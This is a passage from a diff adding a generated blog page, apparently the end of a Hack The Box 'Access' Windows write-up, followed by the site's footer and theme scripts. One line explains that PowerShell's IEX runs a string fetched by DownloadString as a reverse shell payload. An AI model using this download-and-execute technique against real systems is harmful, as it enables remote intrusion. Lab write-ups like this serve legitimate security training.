+<li><code>IEX</code> <strong>(Invoke-Expression)</strong>: Executes the string returned by <code>DownloadString</code>, which is your reverse shell payload.</li>
+</ul>
+<p><img alt="Access (Easy Windows)-14.png" loading="lazy" src="/htb/access-easy-windows/Access%20%28Easy%20Windows%29-14.png"></p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+    </ul>
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2026 <a href="http://localhost:1313/">whoami</a></span> · 
+
+    
+    
+    <span>
+        Powered by
+        <a href="https://gohugo.io/?utm_source=papermod" rel="noopener" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" id="top-link" class="top-link hidden" aria-label="go to top" title="Go to Top (Alt + G)" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+        stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevrons-up">
+        <polyline points="17 11 12 6 7 11"></polyline>
+        <polyline points="17 18 12 13 7 18"></polyline>
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu');
+    if (menu) {
+        
+        const scrollPosition = localStorage.getItem("menu-scroll-position");
+        if (scrollPosition) {
+            menu.scrollLeft = parseInt(scrollPosition, 10);
+        }
+        
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var toplink = document.getElementById("top-link");
+    window.onscroll = function () {
+        const scrollThreshold = window.innerHeight;
+        if (document.body.scrollTop > scrollThreshold || document.documentElement.scrollTop > scrollThreshold) {
+            toplink.classList.remove("hidden");
+        } else {
+            toplink.classList.add("hidden");
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        const html = document.querySelector("html");
+        if (html.dataset.theme === "dark") {
+            html.dataset.theme = 'light';
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            html.dataset.theme = 'dark';
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+</body>
+
+</html>
